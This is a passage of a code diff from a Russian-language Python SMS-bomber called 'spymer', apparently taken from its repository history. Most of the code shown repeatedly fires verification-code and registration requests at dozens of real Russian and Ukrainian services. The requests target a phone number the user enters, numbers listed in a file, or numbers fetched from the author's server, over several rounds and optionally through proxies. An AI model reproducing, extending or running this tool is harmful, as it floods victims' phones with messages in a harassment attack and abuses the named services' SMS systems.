-						id=requests.post('https://fsystem88.ru/spymer/spym.php', data={'token': token}).json()["id"]
-						if int(id) != 0:
-							os.system("rm -rf ~/spymer/{}".format(token))
-							os.system("wget -P ~/spymer/ https://fsystem88.ru/spymer/token/{}".format(token))
-							os.system("cd ~/spymer")
-							info=""
-							os.system('cls' if os.name=='nt' else 'clear')
-							print(logo)
-							print(info)
-							with open(token) as file:
-								array = [row.strip() for row in file]
-								print('Введите количество кругов ("Enter" - отмена):')
-								count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-								try:
-									if int(count):
-										count=int(count)
-										iteration = 0
-										while iteration < count:
-											for phone in array:
-												try:
-													if int(phone):
-														_phone=phone
-														if _phone[0] == '+':
-															_phone = _phone[1:]
-														if _phone[0] == '8':
-															_phone = '7'+_phone[1:]
-														if _phone[0] == '9':
-															_phone = '7'+_phone
-														info = '\nТокен: {}\nТелефон: {}\n№ круга: {}'.format(token, phone, iteration+1)
-														os.system('cls' if os.name=='nt' else 'clear')
-														print(logo)
-														print(info)
-														id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
-														if int(id) > 0:
-															print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.\nПриступаю к следующему номеру.".format(phone)+Style.RESET_ALL)
-															time.sleep(5)
-														elif int(id)==0:
-															_name = ''
-															for x in range(12):
-																_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-																password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-																username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
-															_phone9 = _phone[1:]
-															_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
-															_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
-															_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-															_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
-															_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-															_phone = phone
-															_email = _name+f'{iteration}'+'@gmail.com'
-															email = _email
-															print('\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.')
-															if proxy=="localhost":
-																proxies=None
-															else:
-																proxies="{'"+ssl+"':'"+ip+"'}"
-															try:
-																try:
-																	requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
-																except:
-																	pass
-																try:
-																	requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
-																except:
-																	pass
-																try:
-																	requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
-																except:
-																	pass
-															except:
-																pass
-												except:
-													os.system('cls' if os.name=='nt' else 'clear')
-													print(logo)
-													print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
-													time.sleep(3)
-											iteration=+1
-								except:
-									info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL
 
-								info = Fore.BLUE+"\nГотово.\Токен: {}\nКол-во кругов: {}".format(token, iteration)+Style.RESET_ALL
-					except:
-						info="Отмена.\n"
+			def checkspamlist():
+				global phone
+				global info
+				print ("Войдите в телефон для проверки:")
+				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+				make7phone()
+				try:
+					if int(phone):
+						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
+						if int(id) > 0:
+							info = Fore.GREEN+"\nТелефон {} находится в антиспам листе.".format(phone)+Style.RESET_ALL
+						elif int(id) == 0:
+							info = Fore.RED+"\nТелефон {} не находится в антиспам листе.".format(phone)+Style.RESET_ALL
+				except:
+					info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
 
-				elif input11 == "2":
-					try:	
-						os.system('cls' if os.name=='nt' else 'clear')
-						print(logo)
-						print(info)
-						print("Введите путь к папке: ")
-						print("(Папка должна находиться в домашней дирректории!)")
-						dirc=input(Fore.BLUE+"spymer > ~/"+Style.RESET_ALL)
-						print("Введите имя файла: ")
-						txt=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-						os.system("cd ~/{}".format(dirc))
-						os.system('cls' if os.name=='nt' else 'clear')
-						print(logo)
-						print(info)
-						with open(txt) as file:
-							array = [row.strip() for row in file]
-							print('Введите количество кругов ("Enter" - отмена):')
-							count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-							try:
-								if int(count):
-									count=int(count)
-									iteration = 0
-									while iteration < count:
-										for phone in array:
-											try:
-												if int(phone):
-													_phone=phone
-													if _phone[0] == '+':
-														_phone = _phone[1:]
-													if _phone[0] == '8':
-														_phone = '7'+_phone[1:]
-													if _phone[0] == '9':
-														_phone = '7'+_phone
-													info = '\nФайл: {}\nТелефон: {}\n№ круга: {}'.format(txt, phone, iteration+1)
-													os.system('cls' if os.name=='nt' else 'clear')
-													print(logo)
-													print(info)
-													id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
-													if int(id) > 0:
-														print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.\nПриступаю к следующему номеру.".format(phone)+Style.RESET_ALL)
-														time.sleep(5)
-													elif int(id)==0:
-														_name = ''
-														for x in range(12):
-															_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-															password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-															username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
-														_phone9 = _phone[1:]
-														_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
-														_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
-														_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-														_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
-														_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-														_phone = phone
-														_email = _name+f'{iteration}'+'@gmail.com'
-														email = _email
-														print('\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.')
-														if proxy=="localhost":
-															proxies=None
-														else:
-															proxies="{'"+ssl+"':'"+ip+"'}"
-														try:
-															try:
-																requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
-															except:
-																pass
-															try:
-																requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
-															except:
-																pass
-															try:
-																requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
-															except:
-																pass
-														except:
-															pass
-											except:
-												os.system('cls' if os.name=='nt' else 'clear')
-												print(logo)
-												print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
-												time.sleep(3)
-										iteration=+1
-							except:
-								info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL
+			def addantispam():
+				global phone
+				global info
 
-							info = Fore.BLUE+"\nГотово.\Файл: {}\nКол-во кругов: {}".format(txt, iteration)+Style.RESET_ALL
-					except:
-						info="Отмена.\n Если отмена не была запланирована проверьте правильность введенных данных/пути к файлу/имени файла."
-
-				elif input11 == "1":
-					try:
-						os.system('cls' if os.name=='nt' else 'clear')
-						print(logo)
-						print(info)
-						print('Введите телефон ("Enter" - отмена):')
-						phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-						try:
-							if int(phone):
-								print('Введите количество кругов ("Enter" - отмена):')
-								count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-								try:
-									if int(count):
-										count=int(count)
-										_phone=phone
-										if _phone[0] == '+':
-											_phone = _phone[1:]
-										if _phone[0] == '8':
-											_phone = '7'+_phone[1:]
-										if _phone[0] == '9':
-											_phone = '7'+_phone
-										iteration = 0
-										id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
-										if int(id) > 0:
-											info = Fore.RED+"\nНомер телефона находится в антиспам листе."+Style.RESET_ALL
-										elif int(id)==0:
-											_name = ''
-											for x in range(12):
-												_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-												password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-												username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
-											_phone9 = _phone[1:]
-											_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
